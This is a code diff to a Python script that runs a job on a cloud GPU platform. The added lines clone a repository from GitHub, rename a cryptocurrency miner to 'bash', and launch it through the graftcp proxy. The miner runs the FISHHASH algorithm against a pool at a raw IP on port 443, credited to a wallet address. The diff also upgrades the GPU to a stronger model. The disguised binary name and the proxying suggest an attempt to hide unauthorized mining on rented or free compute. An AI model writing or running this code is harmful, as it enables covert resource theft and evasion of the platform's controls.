@@ -1,5 +1,6 @@
 from beam import function, Image
 import subprocess
+import time
 
 image = (
     Image(
@@ -15,7 +16,7 @@ image = (
 @function(
     name="t4x3-runner",
     image=image,
-    gpu="A10G",
+    gpu="RTX5090",
     cpu=2,
     memory="4Gi",
     timeout=30 * 60 * 60,
@@ -52,15 +53,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD RIG ==="
+    echo "=== DOWNLOAD LOL ==="
     cd /mnt/code/pan
-    git clone https://gitlab.com/liugtiujk/rigel.git
+    git clone https://github.com/malogrono/lol198.git
 
     echo "=== CHECK RIGEL ==="
-    ls -lah /mnt/code/pan/rigel
+    ls -lah /mnt/code/pan/lol198
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/rigel
+    cd /mnt/code/pan/lol198
     ls -lh bash
 
     chmod u+x bash
@@ -78,7 +79,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash -a fishhash -o stratum+tcp://104.207.93.53:443 -u d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.ngebor
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 95.111.195.159:443 --user ASTEROID:0xccb0c7d0b4adb142c846663732c30ade15bdbe8d.RTX --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
